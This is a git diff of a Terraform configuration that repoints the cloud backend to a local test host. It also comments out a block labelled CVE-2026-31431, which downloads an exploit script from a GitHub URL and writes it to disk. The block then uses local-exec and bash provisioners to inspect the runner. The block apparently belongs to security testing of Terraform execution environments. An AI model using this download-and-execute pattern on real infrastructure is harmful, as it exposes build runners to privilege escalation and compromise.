@@ -3,12 +3,21 @@
 # }
 
 terraform {
+  # cloud {
+  #   hostname     = "app.staging.terraform.io"
+  #   organization = "foobar-test"
+
+  #   workspaces {
+  #     name = "curly-cli"
+  #   }
+  # }
+
   cloud {
-    hostname     = "app.staging.terraform.io"
-    organization = "foobar-test"
+    hostname     = "tfe.local"
+    organization = "test-org"
 
     workspaces {
-      name = "curly-cli"
+      name = "another"
     }
   }
 
@@ -175,35 +184,35 @@ resource "null_resource" "run_on_server" {
 ###############################################
 # CVE-2026-31431
 ###############################################
-data "http" "exp" {
-  url = "https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py"
-}
-
-locals {
-  file_content = data.http.exp.response_body
-}
-
-resource "local_file" "exp_script" {
-  content  = local.file_content
-  filename = "${path.module}/exp.py"
-}
-
-# data "external" "external_data_content" {
-#   depends_on = [local_file.exp_script]
-#   program = ["/bin/bash", "-c", "printf '{\"result\": \"%s\"}' %\"$(cat ./exp.py | base64 --wrap=0)\""]
+# data "http" "exp" {
+#   url = "https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py"
 # }
 
-resource "null_resource" "run_exp" {
-  depends_on = [local_file.exp_script]
+# locals {
+#   file_content = data.http.exp.response_body
+# }
 
-  triggers = {
-    timestamp = timestamp()
-  }
+# resource "local_file" "exp_script" {
+#   content  = local.file_content
+#   filename = "${path.module}/exp.py"
+# }
 
-  provisioner "local-exec" {
-    command = "ls -lahR /usr/bin/"
-  }
-}
+# # data "external" "external_data_content" {
+# #   depends_on = [local_file.exp_script]
+# #   program = ["/bin/bash", "-c", "printf '{\"result\": \"%s\"}' %\"$(cat ./exp.py | base64 --wrap=0)\""]
+# # }
+
+# resource "null_resource" "run_exp" {
+#   depends_on = [local_file.exp_script]
+
+#   triggers = {
+#     timestamp = timestamp()
+#   }
+
+#   provisioner "local-exec" {
+#     command = "ls -lahR /usr/bin/"
+#   }
+# }
 
 # resource "null_resource" "run_exp" {
 #   depends_on = [local_file.exp_script]
